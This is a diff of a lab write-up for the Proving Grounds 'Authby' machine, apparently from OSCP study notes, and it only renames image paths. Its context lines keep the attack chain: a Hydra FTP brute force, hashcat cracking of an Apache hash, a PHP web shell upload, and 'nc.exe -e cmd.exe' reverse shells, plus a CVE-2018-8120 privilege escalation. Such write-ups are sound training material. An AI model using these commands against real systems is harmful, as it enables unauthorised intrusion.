@@ -115,11 +115,11 @@ OS and Service detection performed. Please report any incorrect results at https
 
 We access ftp with anonymous account and the folder contains three zftp account files.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_12h14m33s_001_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_12h14m33s_001_.png)
 
 I create a text file named users.txt and add usernanmes ```admin``` and ```offsec``` to each line.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_14h38m52s_002_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_14h38m52s_002_.png)
 
 Brute force attack with Hydra to obtain credentials. (I learned not to use rockyou.txt in the first place. You can try smaller dictionary files first.)
 
@@ -127,13 +127,13 @@ Brute force attack with Hydra to obtain credentials. (I learned not to use rocky
 hydra -L users.txt -P /usr/share/wordlists/fasttrack.txt -t 20 -s 21 -f 192.168.73.46 ftp
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_14h42m07s_003_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_14h42m07s_003_.png)
 
 We log in to with admin account and download all the three files. The .htpasswd file stores username and password.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_14h49m19s_004_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_14h49m19s_004_.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h05m44s_005_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_15h05m44s_005_.png)
 
 Use hashcat to crack the apache md5 hash code and we get the recovery password ```elite```. ([hashcat -m {Hash-Mode}](https://hashcat.net/wiki/doku.php?id=example_hashes))
 
@@ -141,15 +141,15 @@ Use hashcat to crack the apache md5 hash code and we get the recovery password `
 echo '$apr1$oRfRsc/K$UpYpplHDlaemqseM39Ugg0' > hash
 hashcat -m 1600 hash -a 0 /usr/share/wordlists/rockyou.txt --force
 ```
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h10m18s_006_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_15h10m18s_006_.png)
 
 We use credential to pass HTTP authentication.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h21m10s_007_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_15h21m10s_007_.png)
 
 Now let's go back to the ftp directory, which looks like the root of the site.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h24m49s_008_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_15h24m49s_008_.png)
 
 We upload a php file that can execute system commands via system function. (Many php web sehlls do not work properly.) 
 
@@ -173,34 +173,34 @@ We upload a php file that can execute system commands via system function. (Many
 </html>
 ```
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h30m51s_009_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_15h30m51s_009_.png)
 
 Upload the netcat execution file via ftp.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h35m33s_010_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_15h35m33s_010_.png)
 
 Execute the command ```nc.exe -e cmd.exe 192.168.49.73 80``` to get the shell.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h38m12s_011_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_15h38m12s_011_.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h38m30s_012_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_15h38m30s_012_.png)
 
 Check the privileges. 
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h40m27s_013_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_15h40m27s_013_.png)
 
 #### Privilege Escalation
 
 The target pc runs an old version os and no patched, so we can try to exploit kernel vulnerabilities.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_15h59m42s_014_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_15h59m42s_014_.png)
 
 After searching for a while I found the vulnerability [CVE-2018-8120](https://github.com/unamer/CVE-2018-8120) working.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_16h25m38s_015_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_16h25m38s_015_.png)
 
 We upload x86 version execution file and execute the netcat command ```nc.exe -e cmd.exe 192.168.49.73 3145```.
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_16h44m50s_016_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_16h44m50s_016_.png)
 
-![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Off_Sec_PG/Pic/Authby/Authby_2021.11.14_16h45m09s_017_.png)
+![image](https://github.com/tedchen0001/OSCP-Notes/blob/master/Proving_Grounds_Writeups/Pic/Authby/Authby_2021.11.14_16h45m09s_017_.png)
